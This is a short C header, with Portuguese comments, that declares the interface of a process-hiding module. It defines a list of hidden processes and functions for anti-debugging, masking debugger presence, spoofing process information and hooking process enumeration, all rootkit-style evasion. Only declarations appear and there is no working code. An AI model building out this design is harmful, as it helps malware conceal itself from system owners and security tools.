#ifndef PROCESS_HIDING_H
#define PROCESS_HIDING_H

#include <sys/types.h>

// Estrutura para processos ocultos
typedef struct hidden_process {
    pid_t pid;
    char name[256];
    struct hidden_process* next;
} hidden_process_t;

// Funções principais
int init_process_hiding(void);
void cleanup_process_hiding(void);

// Gerenciamento de processos ocultos
int add_hidden_process(pid_t pid, const char* name);
int should_hide_process(pid_t pid, const char* name);

// Anti-debug
int anti_debug_check(void);
void mask_debugger_presence(void);
int is_being_debugged(void);

// Ocultação de informações
void hide_suspicious_threads(void);
void spoof_process_info(void);

// Hooks
int hook_process_enumeration(void* buffer, size_t size);

#endif // PROCESS_HIDING_H